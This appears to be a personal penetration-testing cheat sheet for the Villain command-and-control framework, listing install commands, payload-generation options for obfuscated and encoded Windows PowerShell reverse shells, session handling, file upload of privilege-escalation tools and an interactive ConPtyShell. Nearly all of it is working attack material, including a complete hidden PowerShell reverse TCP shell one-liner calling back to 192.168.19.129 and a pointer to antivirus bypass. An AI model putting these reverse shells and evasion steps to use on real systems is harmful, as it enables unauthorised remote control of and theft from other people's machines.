```
git clone https://github.com/t3l3machus/Villain
```
```
cd Villain
```
```
pip3 install -r requirements.txt
```
```
sudo apt update && sudo apt install gnome-terminal
```
```
python3 Villain.py
```
Standard payload - demo'd below
```
generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0
```
Obfuscated payload
```
generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 obfuscate
```
Base64 encoded
```
generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode
```
Constraint mode
```
generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 constraint_mode
```
Use [[Invoke-Obfuscate]] OR the method below to attempt AV bypass.
`Start-Process $PSHOME\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClient('192.168.19.129',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden`
The payload as printed will not bypass Windows Defender.
[[5._firewall and AntiVirus#PowerShell manual obfuscation]]
```
backdoors
```
Session ID                           IP Address           Shell            Listener  Stability  Status
3ee028-3f8986-ddcf3f  192.168.19.131  powershell.exe  netcat    Stable     Active
```
shell 3ee028-3f8986-ddcf3f
```
Disable Window protections:
[[5._firewall and AntiVirus]]
Upload tools:
[[0.__PrivEsc Tools (WINDOWS)]]
#### Uploading a file
```
upload /home/kali/Desktop/Invoke-winPEAS.ps1 C:\Users\Target\Desktop\Invoke-winPEAS.ps1 3ee028-3f8986-ddcf3f
```
#### Siblings
```
connect $KALI 6501
```
```
siblings
```
#### Chat
Simply add a `#` before any message to broadcast out.
```
#Chat Test!
```
#### conptyshell
ConPtyShell is a Fully Interactive Reverse Shell for Windows systems.
```
conptyshell eth0 9999 3ee028-3f8986-ddcf3f
```